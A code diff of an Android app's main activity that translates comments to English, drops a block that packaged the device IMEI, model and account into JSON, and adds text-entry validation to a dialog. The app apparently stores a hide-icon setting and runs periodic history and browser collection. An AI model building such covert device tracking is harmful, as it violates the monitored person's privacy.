@@ -23,6 +23,8 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
 import android.telephony.TelephonyManager;
+import android.text.Editable;
+import android.text.TextWatcher;
 import android.view.Menu;
 import android.widget.Button;
 import android.widget.EditText;
@@ -92,20 +94,15 @@ public class MainActivity extends Activity {
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 		boolean getInfo = sp.getBoolean("getInfo", false);
 		if (!hasVisited) {
-			// проверка на первый запуск
+			// Is the first time?
 
 			e = sp.edit();
 			e.putBoolean("hasVisited", true);
 			e.putBoolean("getInfo", true);
 			e.putBoolean("hideIcon", false);
 			e.putString("ABOUT", aboutDev);
-			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); // время
-																				// для
-																				// сервиса
-																				// истрои
-																				// и
-																				// браузера
-			e.putString("period", "1"); // периодический запрос каждые 10 минут
+			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis())); 
+			e.putString("period", "1"); // period must equal 10 min
 			e.putString("code", "-1");
 			e.commit();
 
@@ -152,25 +149,7 @@ public class MainActivity extends Activity {
 				e = sp.edit();
 				e.putString("account", value);
 				e.commit();
-
-				SharedPreferences sp = PreferenceManager
-						.getDefaultSharedPreferences(getApplicationContext());
-				Logging.doLog(LOG_TAG, "send start request, imei: ",
-						sp.getString("imei", "imei"));
-
-				JSONObject jsonObject = new JSONObject();
-				try {
-					jsonObject.put("account", sp.getString("account", "0000"));
-					jsonObject.put("imei", sp.getString("imei", "imei"));
-					jsonObject.put("model", sp.getString("model", "0000"));
-				} catch (JSONException e) {
-					e.printStackTrace();
-				}
-
-				// String str = jsonObject.toString();
-				// StartRequest sr = new StartRequest(getApplicationContext());
-				// sr.sendRequest(str);
-				start(); // запуск сервисов
+				start(); // start of services
 				finish();
 			}
 		});
@@ -182,8 +161,51 @@ public class MainActivity extends Activity {
 						finish();
 					}
 				});
-
-		alert.show();
+		
+		final AlertDialog dialog = alert.create();
+		dialog.show();
+		if (input.getText().toString().length() == 0) {
+			((AlertDialog)dialog).getButton(
+					AlertDialog.BUTTON_POSITIVE).setEnabled(false);
+		} else {
+			((AlertDialog)dialog).getButton(
+					AlertDialog.BUTTON_POSITIVE).setEnabled(true);
+		}
+		
+		input.addTextChangedListener(new TextWatcher() {
+			
+			@Override
+			public void onTextChanged(CharSequence s, int start, int before, int count) {
+				if (input.getText().toString().length() == 0) {
+					
+				}
+				
+			}
+			
+			@Override
+			public void beforeTextChanged(CharSequence s, int start, int count,
+					int after) {
+				if (input.getText().toString().length() == 0) {
+					((AlertDialog)dialog).getButton(
+							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
+				} else {
+					((AlertDialog)dialog).getButton(
+							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
+				}
+			}
+			
+			@Override
+			public void afterTextChanged(Editable s) {
+				if (input.getText().toString().length() == 0) {
+					((AlertDialog)dialog).getButton(
+							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
+				} else {
+					((AlertDialog)dialog).getButton(
+							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
+				}
+			}
+		});
+		
 		return true;
 	}
 
@@ -213,7 +235,7 @@ public class MainActivity extends Activity {
 					e = sp.edit();
 					e.putString("account", ID);
 					e.commit();
-					// Log.d("ID", sp.getString("ID", "ID"));
+
 					if (!sp.getString("account", "account").equals("account")) {
 						start();
 						return true;
